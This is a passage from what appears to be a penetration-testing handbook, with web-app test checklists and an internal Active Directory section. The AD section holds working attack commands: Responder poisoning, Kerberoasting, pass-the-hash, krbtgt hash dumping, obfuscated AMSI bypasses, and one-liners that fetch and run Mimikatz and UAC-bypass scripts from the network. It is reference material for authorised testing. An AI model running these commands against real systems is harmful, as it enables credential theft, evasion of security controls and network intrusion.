Account recovery function</li>
<li><input disabled="" type="checkbox"/>
"Remember me" function</li>
<li><input disabled="" type="checkbox"/>
Impersonation function</li>
<li><input disabled="" type="checkbox"/>
Unsafe distribution of credentials</li>
<li><input disabled="" type="checkbox"/>
Fail-open conditions</li>
<li><input disabled="" type="checkbox"/>
Multi-stage mechanisms</li>
<li><input disabled="" type="checkbox"/>
<a href="others/../enumeration/web/sqli.html">SQL Injections</a></li>
<li><input disabled="" type="checkbox"/>
Auto-complete testing</li>
<li><input disabled="" type="checkbox"/>
Lack of password confirmation on change email, password or 2FA (try change response)</li>
<li><input disabled="" type="checkbox"/>
Weak login function over HTTP and HTTPS if both are available</li>
<li><input disabled="" type="checkbox"/>
User account lockout mechanism on brute force attack</li>
<li><input disabled="" type="checkbox"/>
Check for password wordlist (<a href="https://github.com/digininja/CeWL">cewl</a> and <a href="https://github.com/GainSec/GoldenNuggets-1">burp-goldenNuggets</a>)</li>
<li><input disabled="" type="checkbox"/>
Test 0auth login functionality for <a href="others/../enumeration/web/ssrf.html">Open Redirection</a></li>
<li><input disabled="" type="checkbox"/>
Test response tampering in <a href="others/../enumeration/webservices/onelogin-saml-login.html">SAML </a>authentication</li>
<li><input disabled="" type="checkbox"/>
In OTP check guessable codes and race conditions</li>
<li><input disabled="" type="checkbox"/>
OTP, check response manipulation for bypass</li>
<li><input disabled="" type="checkbox"/>
OTP, try bruteforce</li>
<li><input disabled="" type="checkbox"/>
If <a href="others/../enumeration/webservices/jwt.html">JWT</a>, check common flaws</li>
<li><input disabled="" type="checkbox"/>
Browser cache weakness (eg Pragma, Expires, Max-age)</li>
<li><input disabled="" type="checkbox"/>
After register, logout, clean cache, go to home page and paste your profile url in browser, check for "login?next=accounts/profile" for open redirect or XSS with "/login?next=javascript:alert(1);//"</li>
<li><input disabled="" type="checkbox"/>
Try login with common <a href="https://github.com/ihebski/DefaultCreds-cheat-sheet">credentials</a></li>
</ul>
<h3 id="session"><a class="header" href="#session">Session</a></h3>
<ul>
<li><input disabled="" type="checkbox"/>
Session handling</li>
<li><input disabled="" type="checkbox"/>
Test tokens for meaning</li>
<li><input disabled="" type="checkbox"/>
Test tokens for predictability</li>
<li><input disabled="" type="checkbox"/>
Insecure transmission of tokens</li>
<li><input disabled="" type="checkbox"/>
Disclosure of tokens in logs</li>
<li><input disabled="" type="checkbox"/>
Mapping of tokens to sessions</li>
<li><input disabled="" type="checkbox"/>
Session termination</li>
<li><input disabled="" type="checkbox"/>
Session fixation</li>
<li><input disabled="" type="checkbox"/>
<a href="others/../enumeration/web/csrf.html">Cross-site request forgery</a></li>
<li><input disabled="" type="checkbox"/>
Cookie scope</li>
<li><input disabled="" type="checkbox"/>
Decode Cookie (Base64, hex, URL etc.)</li>
<li><input disabled="" type="checkbox"/>
Cookie expiration time</li>
<li><input disabled="" type="checkbox"/>
Check HTTPOnly and Secure flags</li>
<li><input disabled="" type="checkbox"/>
Use same cookie from a different effective IP address or system</li>
<li><input disabled="" type="checkbox"/>
Access controls</li>
<li><input disabled="" type="checkbox"/>
Effectiveness of controls using multiple accounts</li>
<li><input disabled="" type="checkbox"/>
Insecure access control methods (request parameters, Referer header, etc)</li>
<li><input disabled="" type="checkbox"/>
Check for concurrent login through different machine/IP</li>
<li><input disabled="" type="checkbox"/>
Bypass <a href="others/../enumeration/web/csrf.html#csrf-token-bypass">AntiCSRF </a>tokens</li>
<li><input disabled="" type="checkbox"/>
Weak generated security questions</li>
<li><input disabled="" type="checkbox"/>
Path traversal on cookies</li>
<li><input disabled="" type="checkbox"/>
Reuse cookie after session closed</li>
<li><input disabled="" type="checkbox"/>
Logout and click browser "go back" function (Alt + Left arrow)</li>
<li><input disabled="" type="checkbox"/>
2 instances open, 1st change or reset password, refresh 2nd instance</li>
<li><input disabled="" type="checkbox"/>
With privileged user perform privileged actions, try to repeat with unprivileged user cookie.</li>
</ul>
<h3 id="profileaccount-details"><a class="header" href="#profileaccount-details">Profile/Account details</a></h3>
<ul>
<li><input disabled="" type="checkbox"/>
Find parameter with user id and try to tamper in order to get the details of other users</li>
<li><input disabled="" type="checkbox"/>
Create a list of features that are pertaining to a user account only and try <a href="others/../enumeration/web/csrf.html">CSRF</a></li>
<li><input disabled="" type="checkbox"/>
Change email id and update with any existing email id. Check if its getting validated on server or not.</li>
<li><input disabled="" type="checkbox"/>
Check any new email confirmation link and what if user doesn't confirm.</li>
<li><input disabled="" type="checkbox"/>
File <a href="others/../enumeration/web/upload-bypasses.html">upload</a>: <a href="https://secure.eicar.org/eicar.com.txt">eicar</a>, No Size Limit, File extension, Filter Bypass, <a href="https://github.com/portswigger/upload-scanner">burp</a> extension, RCE</li>
<li><input disabled="" type="checkbox"/>
CSV import/export: Command Injection, XSS, macro injection</li>
<li><input disabled="" type="checkbox"/>
Check profile picture URL and find email id/user info or <a href="http://exif.regex.info/exif.cgi">EXIF Geolocation Data</a></li>
<li><input disabled="" type="checkbox"/>
Imagetragick in picture profile upload</li>
<li><input disabled="" type="checkbox"/>
<a href="https://github.com/exiftool/exiftool">Metadata </a>of all downloadable files (Geolocation, usernames)</li>
<li><input disabled="" type="checkbox"/>
Account deletion option and try to reactivate with "Forgot password" feature</li>
<li><input disabled="" type="checkbox"/>
Try bruteforce enumeration when change any user unique parameter.</li>
<li><input disabled="" type="checkbox"/>
Check application request re-authentication for sensitive operations</li>
<li><input disabled="" type="checkbox"/>
Try parameter pollution to add two values of same field</li>
<li><input disabled="" type="checkbox"/>
Check different roles policy</li>
</ul>
<h3 id="forgotreset-password"><a class="header" href="#forgotreset-password">Forgot/reset password</a></h3>
<ul>
<li><input disabled="" type="checkbox"/>
Invalidate session on Logout and Password reset</li>
<li><input disabled="" type="checkbox"/>
Uniqueness of forget password reset link/code</li>
<li><input disabled="" type="checkbox"/>
Reset links expiration time</li>
<li><input disabled="" type="checkbox"/>
Find user id or other sensitive fields in reset link and tamper them</li>
<li><input disabled="" type="checkbox"/>
Request 2 reset passwords links and use the older</li>
<li><input disabled="" type="checkbox"/>
Check if many requests have sequential tokens</li>
<li><input disabled="" type="checkbox"/>
Use username@burp_collab.net and analyze the callback</li>
<li><input disabled="" type="checkbox"/>
Host header injection for token leakage</li>
<li><input disabled="" type="checkbox"/>
Add X-Forwarded-Host: evil.com to receive the reset link with evil.com</li>
<li><input disabled="" type="checkbox"/>
Email crafting like victim@gmail.com@target.com</li>
<li><input disabled="" type="checkbox"/>
IDOR in reset link</li>
<li><input disabled="" type="checkbox"/>
Capture reset token and use with other email/userID</li>
<li><input disabled="" type="checkbox"/>
No TLD in email parameter</li>
<li><input disabled="" type="checkbox"/>
User carbon copy email=victim@mail.com%0a%0dcc:hacker@mail.com</li>
<li><input disabled="" type="checkbox"/>
Long password (&gt;200) leads to DoS</li>
<li><input disabled="" type="checkbox"/>
No rate limit, capture request and send over 1000 times</li>
<li><input disabled="" type="checkbox"/>
Check encryption in reset password token</li>
<li><input disabled="" type="checkbox"/>
Token leak in referer header</li>
<li><input disabled="" type="checkbox"/>
Append second email param and value</li>
<li><input disabled="" type="checkbox"/>
Understand how token is generated (timestamp, username, birthdate,...)</li>
<li><input disabled="" type="checkbox"/>
Response manipulation</li>
</ul>
<h2 id="input-handling"><a class="header" href="#input-handling">Input handling</a></h2>
<ul>
<li><input disabled="" type="checkbox"/>
Fuzz all request parameters (if got user, add headers to fuzzer)</li>
<li><input disabled="" type="checkbox"/>
Identify all reflected data</li>
<li><input disabled="" type="checkbox"/>
<a href="others/../enumeration/web/xss.html">Reflected XSS</a></li>
<li><input disabled="" type="checkbox"/>
HTTP<a href="others/../enumeration/web/header-injections.html"> header injection</a> in GET &amp; POST (X Forwarded Host)</li>
<li><input disabled="" type="checkbox"/>
RCE via Referer Header</li>
<li><input disabled="" type="checkbox"/>
SQL injection via User-Agent Header</li>
<li><input disabled="" type="checkbox"/>
Arbitrary redirection</li>
<li><input disabled="" type="checkbox"/>
Stored attacks</li>
<li><input disabled="" type="checkbox"/>
OS command injection</li>
<li><input disabled="" type="checkbox"/>
Path <a href="others/../enumeration/web/lfi-rfi.html">traversal</a>, LFI and RFI</li>
<li><input disabled="" type="checkbox"/>
Script injection</li>
<li><input disabled="" type="checkbox"/>
File inclusion</li>
<li><input disabled="" type="checkbox"/>
SMTP injection</li>
<li><input disabled="" type="checkbox"/>
Native software flaws (buffer overflow, integer bugs, format strings)</li>
<li><input disabled="" type="checkbox"/>
SOAP injection</li>
<li><input disabled="" type="checkbox"/>
LDAP injection</li>
<li><input disabled="" type="checkbox"/>
SSI Injection</li>
<li><input disabled="" type="checkbox"/>
XPath injection</li>
<li><input disabled="" type="checkbox"/>
<a href="others/../enumeration/web/xxe.html">XXE</a> in any request, change content-type to text/xml</li>
<li><input disabled="" type="checkbox"/>
Stored <a href="others/../enumeration/web/xss.html">XSS</a></li>
<li><input disabled="" type="checkbox"/>
<a href="others/../enumeration/web/sqli.html">SQL </a>injection with ' and '--+-</li>
<li><input disabled="" type="checkbox"/>
<a href="others/../enumeration/webservices/nosql-and-and-mongodb.html">NoSQL </a>injection</li>
<li><input disabled="" type="checkbox"/>
HTTP Request <a href="others/../enumeration/web/request-smuggling.html">Smuggling</a></li>
<li><input disabled="" type="checkbox"/>
<a href="others/../enumeration/web/ssrf.html">Open redirect</a></li>
<li><input disabled="" type="checkbox"/>
Code Injection (&lt;h1&gt;six2dez&lt;/h1&gt; on stored param)</li>
<li><input disabled="" type="checkbox"/>
<a href="others/../enumeration/web/ssrf.html">SSRF </a>in previously discovered open ports</li>
<li><input disabled="" type="checkbox"/>
xmlrpc.php DOS and user enumeration</li>
<li><input disabled="" type="checkbox"/>
HTTP dangerous methods OPTIONS PUT DELETE</li>
<li><input disabled="" type="checkbox"/>
Try to discover hidden parameters (<a href="https://github.com/s0md3v/Arjun">arjun </a>or <a href="https://github.com/maK-/parameth">parameth</a>)</li>
<li><input disabled="" type="checkbox"/>
Insecure deserialization</li>
</ul>
<h3 id="error-handling"><a class="header" href="#error-handling">Error handling</a></h3>
<ul>
<li><input disabled="" type="checkbox"/>
Access custom pages like /whatever_fake.php (.aspx,.html,.etc)</li>
<li><input disabled="" type="checkbox"/>
Add multiple parameters in GET and POST request using different values</li>
<li><input disabled="" type="checkbox"/>
Add "[]", "]]", and "[[" in cookie values and parameter values to create errors</li>
<li><input disabled="" type="checkbox"/>
Generate error by giving input as "/~randomthing/%s" at the end of URL</li>
<li><input disabled="" type="checkbox"/>
Use Burp Intruder "Fuzzing Full" List in input to generate error codes</li>
<li><input disabled="" type="checkbox"/>
Try different HTTP Verbs like PATCH, DEBUG or wrong like FAKE</li>
</ul>
<h2 id="application-logic"><a class="header" href="#application-logic">Application Logic</a></h2>
<ul>
<li><input disabled="" type="checkbox"/>
Identify the logic attack surface</li>
<li><input disabled="" type="checkbox"/>
Test transmission of data via the client</li>
<li><input disabled="" type="checkbox"/>
Test for reliance on client-side input validation</li>
<li><input disabled="" type="checkbox"/>
Thick-client components (Java, ActiveX, Flash)</li>
<li><input disabled="" type="checkbox"/>
Multi-stage processes for logic flaws</li>
<li><input disabled="" type="checkbox"/>
Handling of incomplete input</li>
<li><input disabled="" type="checkbox"/>
Trust boundaries</li>
<li><input disabled="" type="checkbox"/>
Transaction logic</li>
<li><input disabled="" type="checkbox"/>
Implemented CAPTCHA in email forms to avoid flooding</li>
<li><input disabled="" type="checkbox"/>
Tamper product id, price or quantity value in any action (add, modify, delete, place, pay...)</li>
<li><input disabled="" type="checkbox"/>
Tamper gift or discount codes</li>
<li><input disabled="" type="checkbox"/>
Reuse gift codes</li>
<li><input disabled="" type="checkbox"/>
Try parameter pollution to use gift code two times in same request</li>
<li><input disabled="" type="checkbox"/>
Try stored XSS in non-limited fields like address</li>
<li><input disabled="" type="checkbox"/>
Check in payment form if CVV and card number is in clear text or masked</li>
<li><input disabled="" type="checkbox"/>
Check if is processed by the app itself or sent to 3rd parts</li>
<li><input disabled="" type="checkbox"/>
IDOR from other users details ticket/cart/shipment</li>
<li><input disabled="" type="checkbox"/>
Check for test credit card number allowed like 4111 1111 1111 1111 (<a href="https://www.paypalobjects.com/en_GB/vhelp/paypalmanager_help/credit_card_numbers.htm">sample1</a> <a href="http://support.worldpay.com/support/kb/bg/testandgolive/tgl5103.html">sample2</a>)</li>
<li><input disabled="" type="checkbox"/>
Check PRINT or PDF creation for IDOR</li>
<li><input disabled="" type="checkbox"/>
Check unsubscribe button with user enumeration</li>
<li><input disabled="" type="checkbox"/>
Parameter pollution on social media sharing links</li>
<li><input disabled="" type="checkbox"/>
Change POST sensitive requests to GET</li>
</ul>
<h2 id="other-checks"><a class="header" href="#other-checks">Other checks</a></h2>
<h3 id="infrastructure"><a class="header" href="#infrastructure">Infrastructure</a></h3>
<ul>
<li><input disabled="" type="checkbox"/>
Segregation in shared infrastructures</li>
<li><input disabled="" type="checkbox"/>
Segregation between ASP-hosted applications</li>
<li><input disabled="" type="checkbox"/>
Web server vulnerabilities</li>
<li><input disabled="" type="checkbox"/>
Dangerous HTTP methods</li>
<li><input disabled="" type="checkbox"/>
Proxy functionality</li>
<li><input disabled="" type="checkbox"/>
<a href="others/../enumeration/webservices/vhosts.html">Virtual </a>hosting misconfiguration (<a href="https://github.com/codingo/VHostScan">VHostScan</a>)</li>
<li><input disabled="" type="checkbox"/>
Check for internal numeric IP's in request</li>
<li><input disabled="" type="checkbox"/>
Check for external numeric IP's and resolve it</li>
<li><input disabled="" type="checkbox"/>
Test <a href="others/../enumeration/cloud/cloud-info-recon.html">cloud </a>storage</li>
<li><input disabled="" type="checkbox"/>
Check the existence of alternative channels (www.web.com vs m.web.com)</li>
</ul>
<h3 id="captcha"><a class="header" href="#captcha">CAPTCHA</a></h3>
<ul>
<li><input disabled="" type="checkbox"/>
Send old captcha value. </li>
<li><input disabled="" type="checkbox"/>
Send old captcha value with old session ID.</li>
<li><input disabled="" type="checkbox"/>
Request captcha absolute path like www.url.com/captcha/1.png</li>
<li><input disabled="" type="checkbox"/>
Remove captcha with any adblocker and request again</li>
<li><input disabled="" type="checkbox"/>
Bypass with OCR tool (<a href="https://github.com/pry0cc/prys-hacks/blob/master/image-to-text">easy one</a>)</li>
<li><input disabled="" type="checkbox"/>
Change from POST to GET</li>
<li><input disabled="" type="checkbox"/>
Remove captcha parameter</li>
<li><input disabled="" type="checkbox"/>
Convert JSON request to normal</li>
<li><input disabled="" type="checkbox"/>
Try header injections</li>
</ul>
<h3 id="security-headers"><a class="header" href="#security-headers">Security Headers</a></h3>
<ul>
<li><input disabled="" type="checkbox"/>
X-XSS-Protection</li>
<li><input disabled="" type="checkbox"/>
Strict-Transport-Security</li>
<li><input disabled="" type="checkbox"/>
Content-Security-Policy</li>
<li><input disabled="" type="checkbox"/>
Public-Key-Pins</li>
<li><input disabled="" type="checkbox"/>
X-Frame-Options</li>
<li><input disabled="" type="checkbox"/>
X-Content-Type-Options</li>
<li><input disabled="" type="checkbox"/>
Referer-Policy</li>
<li><input disabled="" type="checkbox"/>
Cache-Control</li>
<li><input disabled="" type="checkbox"/>
Expires</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="internal-pentest"><a class="header" href="#internal-pentest">Internal Pentest</a></h1>
<h2 id="scan-1"><a class="header" href="#scan-1">Scan</a></h2>
<h3 id="host--port-scanning"><a class="header" href="#host--port-scanning">Host &amp;&amp; Port Scanning</a></h3>
<ul>
<li><code>-n</code> flag to decrease time avoiding DNS resoltion.</li>
<li><code>-f</code> fragment packets as FW evasion, if no FW/IDS, remove it.</li>
<li>Also check <a href="others/../recon/host-scanning.html#nmap">FW evasion</a></li>
</ul>
<pre><code class="language-bash"># Ping discovery, Top 20, fragment packets, no DNS resolution
sudo nmap -v --top-ports 20 X.X.X.0/24 -f -n --open -oA
# Ping discovery, Top 200, fragment packets, no DNS resolution, service version
sudo nmap -v --top-ports 200 X.X.X.0/24 -f -n -sV --open -oA
# Top 1000, fragment packets, no DNS resolution, service version, all alive (no ping)
sudo nmap -v --top-ports 1000 X.X.X.0/24 -f -n -sV -Pn --open -oA
</code></pre>
<h3 id="web-detection"><a class="header" href="#web-detection">Web detection</a></h3>
<pre><code class="language-bash"># httpx
cat ip.txt | httpx -silent -random-agent -status-code -timeout 15 -title -web-server -tech-detect -o httpx.txt
cat ip.txt | httpx -silent -ports &lt;UNCOMMON.PORTS&gt; -random-agent -status-code -timeout 15 -title -web-server -tech-detect -o httpx_uncommon.txt
</code></pre>
<h2 id="enum-1"><a class="header" href="#enum-1">Enum</a></h2>
<p>Check <a href="others/../post-exploitation/windows/ad/">AD section</a> too</p>
<p>hint style="info"
Must-read:</p>
<ul>
<li><a href="https://wadcoms.github.io">wadcoms.github.io</a></li>
<li><a href="https://adsecurity.org/">adsecurity.org</a></li>
<li><a href="https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/">casvancooten AD cheatsheet</a></li>
<li><a href="https://zer1t0.gitlab.io/posts/attacking_ad/">zer1t0 Attack AD</a></li>
<li><a href="https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet">integration-IT AD cheatsheet</a></li>
</ul>
<p>endhint</p>
<h3 id="ad-no-credentials"><a class="header" href="#ad-no-credentials">AD no credentials</a></h3>
<pre><code class="language-bash"># Detect SMB on network
responder-RunFinger -i X.X.X.0/24

# Find DC
nslookup -q=srv _ldap._tcp.dc._msdcs.&lt;domain.name&gt;
nslookup -type=srv _ldap._tcp.&lt;domain.name&gt; | grep ldap | cut -d ' ' -f 6 | sed 's/\.$//g'

# Enumerate DC
ldapsearch -h &lt;DC.IP&gt; -x -s base namingcontexts

# Check for null session, if got users go for ASREPRoast with GetNPUsers
ldapsearch -h &lt;DC.IP&gt; -x -b "DC=XX,DC=XX"

# Get hashes with no krb preauth
GetNPUsers.py [Domain Name]/ -dc-ip [Domain Controller IP address] -request
GetNPUsers.py 'DC.LOCAL/' -usersfile users.txt -format hashcat -outputfile hashes.aspreroast -dc-ip 10.10.10.10

# Get domain name
crackmapexec smb 10.10.10.10
smbmap -H 10.10.10.10 -u '' -p ''

# Get Users List
GetADUsers.py DC.local/ -dc-ip 10.10.10.10 -debug

# Get Users from ldap
windapsearch -U — full — dc-ip 10.10.10.10

# Get base domain
ldapsearch -x -h 10.10.10.175 -s base namingcontexts

# Get more info from DC
ldapsearch -x -h 10.10.10.10 -b ‘DC=DCNAME,DC=LOCAL’
</code></pre>
<h3 id="ad-with-credentials"><a class="header" href="#ad-with-credentials">AD with credentials</a></h3>
<ul>
<li>Enum AD AIO</li>
</ul>
<pre><code class="language-bash"># https://github.com/CasperGN/ActiveDirectoryEnumeration
python3 -m ade --dc &lt;domain.name&gt; -u &lt;user@domain.name&gt; --help
# https://github.com/adrecon/ADRecon from Windows on Domain

</code></pre>
<ul>
<li>windapsearch</li>
</ul>
<pre><code class="language-bash"># https://github.com/ropnop/go-windapsearch
windapsearch -d &lt;domain&gt;.&lt;name&gt; -u &lt;user&gt; -p &lt;password&gt; --help
</code></pre>
<ul>
<li>ldap</li>
</ul>
<pre><code class="language-bash"># Domain users
ldapsearch -LLL -x -H ldap://&lt;DC.IP&gt; -D "&lt;USER&gt;@&lt;DOMAIN.NAME&gt;" -w '&lt;PASSWORD&gt;' -b dc=&lt;DOMAIN NAME&gt;,dc=&lt;DOMAIN NAME&gt; -o ldif-wrap=no "(&amp;(objectClass=user)(objectCategory=person))" name sAMAccountName userPrincipalName memberOf primaryGroupID adminCount userAccountControl description servicePrincipalName objectSid pwdLastSet lastLogon -E pr=1000/noprompt | tee domain_users.txt

# Domain computers
ldapsearch -LLL -x -H ldap://&lt;DC.IP&gt; -D "&lt;USER&gt;@&lt;DOMAIN.NAME&gt;" -w '&lt;PASSWORD&gt;' -b dc=&lt;DOMAIN NAME&gt;,dc=&lt;DOMAIN NAME&gt; -o ldif-wrap=no "(objectClass=computer)" name dNSHostname memberOf operatingSystem operatingSystemVersion lastLogonTimestamp servicePrincipalName description userAccountControl | tee domain_computers.txt

# Domain groups
ldapsearch -LLL -x -H ldap://&lt;DC.IP&gt; -D "&lt;USER&gt;@&lt;DOMAIN.NAME&gt;" -w '&lt;PASSWORD&gt;' -b dc=&lt;DOMAIN NAME&gt;,dc=&lt;DOMAIN NAME&gt; -o ldif-wrap=no "(objectClass=group)" name sAMAccountName memberOf member description objectSid | tee domain_groups.txt
</code></pre>
<ul>
<li>rpcclient</li>
</ul>
<pre><code class="language-bash">rpcclient -U "DOMAIN/username%password" &lt;domaincontroller name or IP&gt;" -c dsr_enumtrustdom
rpcclient -U "DOMAIN/username%password" &lt;domaincontroller name or IP&gt;" -c enumdomains
rpcclient -U "DOMAIN/username%password" &lt;domaincontroller name or IP&gt;" -c enumdomusers
rpcclient -U "DOMAIN/username%password" &lt;domaincontroller name or IP&gt;" -c enumdomgroups
rpcclient -U "DOMAIN/username%password" &lt;domaincontroller name or IP&gt;" -c getdompwinfo
</code></pre>
<ul>
<li>cme</li>
</ul>
<pre><code class="language-bash"># Run commands

# PS
cme smb &lt;IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -X 'Get-Host'
# CMD
cme smb &lt;IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -x whoami
# PTH
cme smb &lt;IP&gt; -u &lt;USER&gt; -H &lt;NTHASH&gt; -x whoami
# Other methods
cme smb &lt;IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --exec-method {mmcexec,smbexec,atexec,wmiexec}

# Dumps

# SAM
cme smb &lt;IP&gt; -d &lt;DOMAIN&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --sam
# LSASS
cme smb &lt;IP&gt; -d &lt;DOMAIN&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --lsa
# Sessions
cme smb &lt;IP&gt; -d &lt;DOMAIN&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --sessions
# Logged users
cme smb &lt;IP&gt; -d &lt;DOMAIN&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --loggedon-users
# Disks
cme smb &lt;IP&gt; -d &lt;DOMAIN&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --disks
# Users
cme smb &lt;IP&gt; -d &lt;DOMAIN&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --users #Enumerate users
# Groups
cme smb &lt;IP&gt; -d &lt;DOMAIN&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --groups
# Local groups
cme smb &lt;IP&gt; -d &lt;DOMAIN&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --local-groups
# Password policy
cme smb &lt;IP&gt; -d &lt;DOMAIN&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --pass-pol
</code></pre>
<h2 id="attacks-4"><a class="header" href="#attacks-4">Attacks</a></h2>
<h3 id="llmnr--nbt-ns-poisoning-responder"><a class="header" href="#llmnr--nbt-ns-poisoning-responder">LLMNR &amp; NBT-NS Poisoning (Responder)</a></h3>
<ul>
<li>Find a privileged user creds to reuse in other host</li>
<li>Set to <code>Off</code> SMB and HTTP in <code>/usr/share/responder/Responder.conf</code></li>
</ul>
<pre><code class="language-bash">responder -I ppp0 -A                # Only listen
responder -I ppp0 -rv exec bash     # Poison
</code></pre>
<ul>
<li>MultiRealy reuses hashes captured in specific host while responder is running</li>
</ul>
<pre><code class="language-bash">MultiRelay.py -t X.X.X.X -u ALL
</code></pre>
<h3 id="kerberos-1"><a class="header" href="#kerberos-1">Kerberos</a></h3>
<ul>
<li><a href="https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a">Cheatsheet</a></li>
</ul>
<pre><code class="language-bash"># Kerberoasting (hashcat 13100)
GetUserSPNs.py -request -save -dc-ip &lt;IP&gt; domain/user # hashcat 13100

# BF
kerbrute.py -d &lt;DC.LOCAL&gt; -users &lt;users_file&gt; -passwords &lt;passwords_file&gt; -outputfile &lt;output_file&gt;

# ASREPRoast (hashcat 18200)
GetNPUsers.py &lt;domain_name&gt;/ -usersfile &lt;users_file&gt; -format &lt;AS_REP_responses_format [hashcat | john]&gt; -outputfile &lt;output_AS_REP_responses_file&gt;

# PTH/PTK
# Request ticket
getTGT.py &lt;domain_name&gt;/&lt;user_name&gt; -hashes [lm_hash]:&lt;ntlm_hash&gt;
getTGT.py &lt;domain_name&gt;/&lt;user_name&gt; -aesKey &lt;aes_key&gt;
getTGT.py &lt;domain_name&gt;/&lt;user_name&gt;:[password]
# Set ticket
export KRB5CCNAME=&lt;TGT_ccache_file&gt;
# Use it
psexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass
psexec.py -hashes 'hash' -dc-ip 10.10.10.10 username@10.10.10.10
smbexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass
wmiexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass
</code></pre>
<h3 id="dumps"><a class="header" href="#dumps">Dumps</a></h3>
<pre><code class="language-bash"># User hash
secretsdump.py '&lt;DC.NAME&gt;/&lt;User&gt;@&lt;DC.IP&gt;' -just-dc-user user1

# krbtgt hash dump -&gt; Golden Ticket
secretsdump.py '&lt;DC.NAME&gt;/&lt;User&gt;@&lt;DC.IP&gt;' -just-dc-user krbtgt
</code></pre>
<h3 id="amsi-bypass"><a class="header" href="#amsi-bypass">AMSI Bypass</a></h3>
<pre><code class="language-bash"># Basic
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Obfuscation
sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

# Other bypass
[Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True)
</code></pre>
<h3 id="common-exploits"><a class="header" href="#common-exploits">Common Exploits</a></h3>
<ul>
<li><a href="https://github.com/SecuraBV/CVE-2020-1472">ZeroLogon</a></li>
<li>EternalBlue: use auxiliary/scanner/smb/smb_ms17_010</li>
<li><a href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/">PrivExchange</a></li>
<li><a href="https://github.com/ZecOps/SMBGhost-SMBleed-scanner">SMBGhost and SMBleed</a></li>
</ul>
<h2 id="privesc"><a class="header" href="#privesc">PrivEsc</a></h2>
<h3 id="local-privilege-escalation"><a class="header" href="#local-privilege-escalation">Local Privilege Escalation</a></h3>
<pre><code class="language-bash"># Juicy Potato - Abuse SeImpersonate or SeAssignPrimaryToken Privileges for System Impersonation
# Works only until Windows Server 2016 and Windows 10 until patch 1803
https://github.com/ohpe/juicy-potato
https://github.com/TsukiCTF/Lovely-Potato

# PrintSpoofer Exploit the PrinterBug for System Impersonation
# Works for Windows Server 2019 and Windows 10
https://github.com/itm4n/PrintSpoofer

# RoguePotato from Service Account to System
# Works for Windows Server 2019 and Windows 10
https://github.com/antonioCoco/RoguePotato

# Abusing Token Privileges
# https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/

# SMBGhost CVE-2020–0796
https://github.com/danigargu/CVE-2020-0796

# CVE-2021–36934 (HiveNightmare/SeriousSAM)
https://github.com/cube0x0/CVE-2021-36934
</code></pre>
<h2 id="extra"><a class="header" href="#extra">Extra</a></h2>
<h3 id="oneliners-1"><a class="header" href="#oneliners-1">Oneliners</a></h3>
<pre><code class="language-bash"># Invoke-BypassUAC and start PowerShell prompt as Administrator [Or replace to run any other command]
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-BypassUAC.ps1');Invoke-BypassUAC -Command 'start powershell.exe'"

# Invoke-Mimikatz: Dump credentials from memory
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"

# Import Mimikatz Module to run further commands
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')"

# Invoke-MassMimikatz: Use to dump creds on remote host [replace $env:computername with target server name(s)]
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PewPewPew/Invoke-MassMimikatz.ps1');'$env:COMPUTERNAME'|Invoke-MassMimikatz -Verbose"

# PowerUp: Privilege escalation checks
powershell.exe -exec Bypass -C “IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1’);Invoke-AllChecks”

# Invoke-Inveigh and log output to file
